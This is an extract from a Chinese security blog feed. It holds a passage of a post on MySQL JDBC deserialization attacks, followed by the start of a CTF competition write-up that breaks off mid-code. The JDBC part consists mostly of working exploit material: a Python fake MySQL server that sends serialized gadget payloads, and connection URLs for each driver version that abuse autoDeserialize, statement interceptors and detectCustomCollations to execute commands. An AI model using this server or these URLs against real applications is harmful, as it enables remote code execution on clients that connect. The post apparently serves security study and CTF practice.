class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>也可以采用如下项目<br><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a><br><a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></p><p>我这里采用的是4ra1n师傅的项目复现的</p><img src="/post/7e872f66/IMAGE20250108133636013.png" class=""><p>可以成功复现。下面就来看看流程</p><img src="/post/7e872f66/IMAGE20250108134010623.png" class=""><p>可以看到这里又调用了<code>getConnection</code>继续跟进去看看</p><img src="/post/7e872f66/IMAGE20250108134035846.png" class=""><p>调用了<code>connect</code>方法</p><img src="/post/7e872f66/IMAGE20250108134123968.png" class=""><p>参数没什么变化，会进入到第一个case里，然后调用<code>getInstance</code>方法</p><img src="/post/7e872f66/IMAGE20250108134218595.png" class=""><p>返回一个<code>ConnectionImpl</code>方法跟进去</p><img src="/post/7e872f66/IMAGE20250108134303411.png" class=""><p>这里就是一些 evil mysql的一些参数</p><img src="/post/7e872f66/IMAGE20250108134447253.png" class=""><p>下面会调用一个<code>initializeSafeQueryInterceptors</code>方法，跟进去</p><img src="/post/7e872f66/IMAGE20250108134639547.png" class=""><p>这里就是一些初始化的操作，继续跟下去，跟进<code>createNewIO</code>方法</p><img src="/post/7e872f66/IMAGE20250108134705072.png" class=""><img src="/post/7e872f66/IMAGE20250108134803955.png" class=""><p>会调用<code>connectOneTryOnly</code>方法并且参数是false，跟进去</p><img src="/post/7e872f66/IMAGE20250108135001000.png" class=""><p>继续初始化</p><img src="/post/7e872f66/IMAGE20250108135029265.png" class=""><p>调用了<code>handleAutoCommitDefaults</code>方法跟进去</p><img src="/post/7e872f66/IMAGE20250108135151406.png" class=""><p>调用<code>setAutoCommit</code>设置为True</p><img src="/post/7e872f66/IMAGE20250108135253426.png" class=""><p>执行sql语句跟进</p><img src="/post/7e872f66/IMAGE20250108135432198.png" class=""><p>这里会向服务端发送数据包，跟进<code>sendQueryString</code>方法</p><img src="/post/7e872f66/IMAGE20250108135651368.png" class=""><p>最后返回<code>sendQueryPacket</code>方法跟进</p><img src="/post/7e872f66/IMAGE20250108135720255.png" class=""><p>会调用<code>invokeQueryInterceptorsPre</code>方法</p><img src="/post/7e872f66/IMAGE20250108135752848.png" class=""><p>这里有熟悉的preProcess方法了，继续跟进</p><img src="/post/7e872f66/IMAGE20250108135816047.png" class=""><p>继续调用</p><img src="/post/7e872f66/IMAGE20250108135828355.png" class=""><p>可以看到熟悉的东西了，跟进去</p><img src="/post/7e872f66/IMAGE20250108140034270.png" class=""><p>上面的sql语句查询恶意的服务端会返回序列化数据，然后调用<code>resultSetToMap</code>方法在调用getObject方法实现反序列化。</p><p>列一下调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">transform:<span class="number">123</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">158</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">74</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">121</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">getObject:<span class="number">1326</span>, ResultSetImpl (com.mysql.cj.jdbc.result)</span><br><span class="line">resultSetToMap:<span class="number">46</span>, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br><span class="line">populateMapWithSessionStatusValues:<span class="number">87</span>, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">105</span>, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">76</span>, NoSubInterceptorWrapper (com.mysql.cj)</span><br><span class="line">invokeQueryInterceptorsPre:<span class="number">1137</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryPacket:<span class="number">963</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryString:<span class="number">914</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">execSQL:<span class="number">1150</span>, NativeSession (com.mysql.cj)</span><br><span class="line">setAutoCommit:<span class="number">2064</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">handleAutoCommitDefaults:<span class="number">1382</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">1327</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">966</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:<span class="number">825</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">455</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:<span class="number">240</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:<span class="number">207</span>, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">270</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">10</span>, Jdbc8 (com.ocean)</span><br></pre></td></tr></table></figure><p>这里的jdbc版本是8,低版本大致流程也是这样，只有少数异同点，但最后都是进入getObject方法触发反序列化</p><h3 id="5-1-0-5-1-10">5.1.0-5.1.10</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.PreparedStatement;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc5</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;  </span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> (PreparedStatement) connection.prepareStatement(sql);  </span><br><span class="line"><span class="comment">//执行查询操作，返回的是数据库结果集的数据表  </span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/7e872f66/IMAGE20250108141740455.png" class=""><h3 id="5-1-11-5-x-xx">5.1.11-5.x.xx</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc5_1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/7e872f66/IMAGE20250108141922902.png" class=""><h3 id="6-x">6.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc6</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/7e872f66/IMAGE20250108142247010.png" class=""><h2 id="detectCustomCollations链">detectCustomCollations链</h2><p>这里的不同点在与走的是 <code>com.mysql.cj.jdbc.ConnectionImpl</code>类的<code>buildCollationMapping</code>方法之后都是一个流程前面也是一样的</p><img src="/post/7e872f66/IMAGE20250108142926685.png" class=""><p>列一下可以用的版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) MYSQL5<span class="number">.1</span><span class="number">.41</span>及以上: 不可用</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) MYSQL5<span class="number">.1</span><span class="number">.29</span>-<span class="number">5.1</span><span class="number">.40</span>:</span><br><span class="line"></span><br><span class="line">jdbc:mysql:<span class="comment">//127.0.0.1:3306/test?detectCustomCollations=true&amp;amp;autoDeserialize=true&amp;amp;user=yso_JRE8u20_calc</span></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>) MYSQL5<span class="number">.1</span><span class="number">.28</span>-<span class="number">5.1</span><span class="number">.19</span>:</span><br><span class="line"></span><br><span class="line">jdbc:mysql:<span class="comment">//127.0.0.1:3306/test?autoDeserialize=true&amp;amp;user=yso_JRE8u20_calc</span></span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>) MYSQL5<span class="number">.1</span><span class="number">.18</span>以下的<span class="number">5.1</span>.x版本: 不可用</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>) MYSQL5<span class="number">.0</span>.x版本: 不可用</span><br></pre></td></tr></table></figure><p>剩下的就是依然可以利用工具进行复现就不在复现了。</p><h3 id="5-1-41-5-1-48">5.1.41-5.1.48</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-29-5-1-40">5.1.29-5.1.40</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-19-5-1-28">5.1.19-5.1.28</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="6-0-2-6-0-6">6.0.2-6.0.6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Connection conn=<span class="literal">null</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections7_calc&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections7_calc&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        conn = DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://forum.butian.net/share/2872">https://forum.butian.net/share/2872</a><br><a href="https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/03/11/WebDog必学的JDBC反序列化/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;条件&quot;&gt;条件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Jdbc可控且目标机器出网。&lt;/li&gt;
&lt;li&gt;存在反序列化利用链的漏洞组件例如cc链那些。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;前置知识&quot;&gt;前置知识&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BLOB为二进制形式的长文本数据&lt;/li</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="JDBC" scheme="https://oceanzbz.github.io/tags/JDBC/"/>
    
  </entry>
  
  <entry>
    <title>软件系统安全攻防赛Wp</title>
    <link href="https://oceanzbz.github.io/post/e5e27309.html"/>
    <id>https://oceanzbz.github.io/post/e5e27309.html</id>
    <published>2025-01-06T04:13:54.000Z</published>
    <updated>2025-03-05T07:24:36.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id="钓鱼邮件">钓鱼邮件</h2><p>这题是签到题，给了一个邮件，我是用的飞书打开的</p><img src="/post/e5e27309/IMAGE20250106121545994.png" class=""><p>这里面有一个附件打开需要密码可以看到提示和邮件日期时间推测为生日密码。打开之后是一个木马样本丢到微步没分析出来外联ip和端口于是就放自己本地虚拟机跑了下看网络通信，能找到ip直接md5加密提交即可</p><img src="/post/e5e27309/IMAGE20250106121727731.png" class=""><h2 id="donntyousee">donntyousee</h2><p>首先去除花枝令，是把一个函数拆分成了两段，把图中一段nop掉再U+P，需要对俩个函数去花，第一个是start中405559，的第二个函数是动调查看的405eaa。</p><img src="/post/e5e27309/IMAGE20250106121816891.png" class=""><p>发现是rc4算法，变异了一步异或0x23,密文需要动调查看，密文如下：</p><img src="/post/e5e27309/IMAGE20250106121831656.png" class=""><p>比较恶心的是存在反调试，因此动调获得的密钥是错误的，静态查看的密钥是正确的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;\x92\x1C+\x1F\xBA\xFB\xA2\xFF\ai&#125;w\x18\x8C&#x27;</span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="built_in">bytearray</span>([<span class="number">0x25</span>,<span class="number">0xCD</span>, <span class="number">0x54</span>, <span class="number">0xAF</span>, <span class="number">0x51</span>, <span class="number">0x1C</span>, <span class="number">0x58</span>, <span class="number">0xD3</span>, <span class="number">0xA8</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0x5D</span>, <span class="number">0xD4</span>, <span class="number">0xF6</span>, <span class="number">0x47</span>, <span class="number">0x4A</span>, <span class="number">0x6F</span>, <span class="number">0xE0</span>, <span class="number">0x73</span>, <span class="number">0xB0</span>, <span class="number">0xA5</span>, <span class="number">0xA8</span>, <span class="number">0xC3</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0x5E</span>, <span class="number">0x2B</span>, <span class="number">0xF4</span>, <span class="number">0xF6</span>, <span class="number">0x71</span>, <span class="number">0xEA</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0xA8</span>, <span class="number">0x63</span>, <span class="number">0x99</span>, <span class="number">0x57</span>]</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line">decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> decrypted_data:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="number">0x23</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="CachedVisitor">CachedVisitor</h2><p>这题自己有点蠢了当时比赛的时候看着能进复赛了就走了没做，因为前面确实尝试了很多次忘了附件里给了readflag导致一直没打成功赛后吃了个海底捞回来复现了一下做出来的太蠢了自己。</p><p>先来看看源码</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 